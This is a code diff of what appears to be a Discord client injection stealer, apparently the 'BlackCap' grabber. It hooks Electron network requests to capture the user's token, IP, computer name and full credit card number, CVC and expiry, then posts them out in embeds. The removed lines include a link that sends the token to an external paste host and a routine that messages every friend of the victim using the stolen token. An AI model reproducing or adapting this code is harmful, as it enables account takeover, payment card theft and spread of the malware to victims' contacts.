@@ -106,14 +106,7 @@ const getGifOrPNG = async (url) => {
     else return url + tt[1]
 }
 
-const GetBadges = (e) => {
-    var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
-}
-const GetRBadges = (e) => {
-    var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
-}
+
 
 const GetNSFW = (bouki) => {
     switch (bouki) {
@@ -137,19 +130,7 @@ const GetA2F = (bouki) => {
 }
 
 
-const parseFriends = friends => {
-    var real = friends.filter(x => x.type == 1)
-    var rareFriends = ""
-    for (var friend of real) {
-        var badges = GetRBadges(friend.user.public_flags)
-        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
-    }
-    if (!rareFriends) rareFriends = "No Rare Friends"
-    return {
-        len: real.length,
-        badges: rareFriends
-    }
-}
+
 
 const parseBilling = billings => {
     var Billings = ""
@@ -271,7 +252,7 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: "Initalized",
             fields: [{
-                name: "Injection Info",
+                name: "Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                 inline: !1
             }]
@@ -290,7 +271,7 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: "Initalized",
             fields: [{
-                name: "Injection Info",
+                name: "Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                 inline: !1
             }, {
@@ -304,10 +285,6 @@ const FirstTime = async () => {
             }, {
                 name: "Nitro <a:nitro:1041639670288748634>",
                 value: `${GetNitro(Nitro)}`,
-                inline: !0
-            }, {
-                name: "Badges <:badge:1041634538150973460>",
-                value: `${GetBadges(user.flags)}`,
                 inline: !0
             }, {
                 name: "Language <:language:1041640473477001236>",
@@ -335,7 +312,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "<a:tokens:1041634540537511957> Token",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
+                value: `\`${token}\``,
                 inline: !1
             }],
             image: userBanner,
@@ -461,7 +438,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 title: "Initalized",
                 color: config['embed-color'],
                 fields: [{
-                    name: "Injection Info",
+                    name: "Info",
                     value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                     inline: !1
                 }, {
@@ -475,10 +452,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 }, {
                     name: "Nitro <a:nitro:1041639670288748634>",
                     value: `${GetNitro(Nitro)}`,
-                    inline: !0
-                }, {
-                    name: "Badges <:badge:1041634538150973460>",
-                    value: `${GetBadges(user.flags)}`,
                     inline: !0
                 }, {
                     name: "Language <:language:1041640473477001236>",
@@ -510,7 +483,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "<a:tokens:1041634540537511957> Token",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
+                    value: `\`${token}\``,
                     inline: !1
                 }],
 
@@ -527,7 +500,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "Credit Card",
+                title: "BlackCap User Credit Card Added",
                 description: `
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
@@ -537,7 +510,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 **Language** <:language:1041640473477001236>\n${GetLangue(user.locale)}\n
                 **A2F** <a:a2f:1040272766982692885>\n${GetA2F(user.mfa_enabled)}\n
                 **NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(user.nsfw_allowed)}\n
-                **Badges** <:badge:1041634538150973460>\n${GetBadges(user.flags)}\n
                 **Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
                 **Credit Card Expiration**\n\`\`\`${month}/${year}\`\`\`\n
                 **CVC**\n\`\`\`${CardCVC}\`\`\`\n
@@ -553,106 +525,4 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             break
     }
 })
-
-
-
-
-
-
-const fetch = require('node-fetch');
-
-const token = token;
-const M = '???';
-
-async function getFriendsList(token) {
-    const headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    };
-    try {
-        const response = await fetch("https://discord.com/api/v6/users/@me/relationships", {
-            method: 'GET',
-            headers: headers
-        });
-        const friendList = await response.json();
-        return friendList.map(friend => friend.user.id);
-    } catch (error) {
-        console.error('Error fetching friends list:', error);
-        return [];
-    }
-}
-
-async function sendMessageToFriend(token, recipientIds, message) {
-    const headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    };
-
-    try {
-        for (const recipientId of recipientIds) {
-            const response = await fetch('https://discord.com/api/v10/users/@me/channels', {
-                method: 'POST',
-                headers: headers,
-                body: JSON.stringify({ recipient_id: recipientId })
-            });
-
-            if (response.status === 200) {
-                const { id: channelId } = await response.json();
-                if (channelId) {
-                    const messageData = {
-                        content: message
-                    };
-                    const messageResponse = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
-                        method: 'POST',
-                        headers: headers,
-                        body: JSON.stringify(messageData)
-                    });
-                    if (messageResponse.status === 200) {
-                        console.log(`Message successfully sent to user with ID ${recipientId}`);
-                    } else {
-                        console.error('Error sending message');
-                        console.error(await messageResponse.text());
-                    }
-                } else {
-                    console.error('Error getting channel ID');
-                }
-            } else {
-                console.error('Error creating channel for message');
-                console.error(await response.text());
-            }
-        }
-    } catch (error) {
-        console.error('An error occurred:', error);
-    }
-}
-
-async function main() {
-    const friendIds = await getFriendsList(TOKEN);
-    console.log("Friend list:", friendIds);
-    await sendMessageToFriend(TOKEN, friendIds, M);
-}
-
-main();
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 module.exports = require("./core.asar")
